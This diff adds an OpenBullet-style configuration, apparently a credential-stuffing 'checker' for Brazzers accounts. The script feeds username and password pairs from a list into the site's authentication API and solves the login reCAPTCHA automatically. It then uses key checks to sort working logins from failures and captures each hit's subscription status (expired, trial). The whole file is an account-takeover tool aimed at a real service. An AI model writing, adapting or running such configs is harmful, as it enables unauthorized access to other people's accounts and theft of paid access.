@@ -1,0 +1,140 @@
+[SETTINGS]
+{
+  "Name": "brazzers cap",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-03-12T19:49:55.5722099+05:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "playernoob0",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://site-ma.brazzers.com/" 
+  
+  HEADER "Host: site-ma.brazzers.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.brazzers.com/home" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<COOKIES(instance_token)>" LR "" "" -> VAR "instance_token" 
+
+SOLVECAPTCHA ReCaptchaV2 "6LcS9rQUAAAAAJbcv0HU0g2UrXLypd7ciXp2nOdn" "https://site-ma.brazzers.com/login" 
+
+REQUEST POST "https://site-api.project1service.com/v1/authenticate/redirect" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"googleReCaptchaResponse\":\"<SOLUTION>\",\"successUrl\":\"https://site-ma.brazzers.com/access/success\",\"failureUrl\":\"https://site-ma.brazzers.com/access/failure\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: site-api.project1service.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://site-ma.brazzers.com/login" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Instance: <instance_token>" 
+  HEADER "Origin: https://site-ma.brazzers.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" JSON "authenticationUrl" -> VAR "url1" 
+
+REQUEST GET "<url1>" 
+  
+  HEADER "Host: probiller.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://site-ma.brazzers.com/login" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<ADDRESS>" Contains "https://join.brazzers.com/joinbadlogin?" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "https://probiller.com/site/login/default/domain/www.brazzers.com?" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"response\" value=\"" "\"" -> VAR "auth" 
+
+!PARSE "<auth1>" LR "<input type=\"hidden\" name=\"response\" value=\"" "\" />" -> VAR "auth" 
+
+REQUEST POST "https://site-ma.brazzers.com/access/failure?postFallback=1" 
+  CONTENT "response=<auth>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: site-ma.brazzers.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://probiller.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: <url1>" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" LR "{\"authToken\":\"" "\"," -> VAR "authToken" 
+
+REQUEST GET "https://site-ma.brazzers.com/account" 
+  
+  HEADER "Host: site-ma.brazzers.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" LR "\"jwt\":\"" "\"," -> VAR "JWT" 
+
+REQUEST GET "https://site-api.project1service.com/v1/self" 
+  
+  HEADER "Host: site-api.project1service.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Authorization: <authToken>" 
+  HEADER "Instance: <JWT>" 
+  HEADER "Origin: https://site-ma.brazzers.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://site-ma.brazzers.com/postlogin" 
+
+PARSE "<SOURCE>" LR "\"isExpired\":" "," CreateEmpty=FALSE -> CAP "isExpired" 
+
+PARSE "<SOURCE>" LR "\"isTrial\":" "," CreateEmpty=FALSE -> CAP "isTrial" 
+
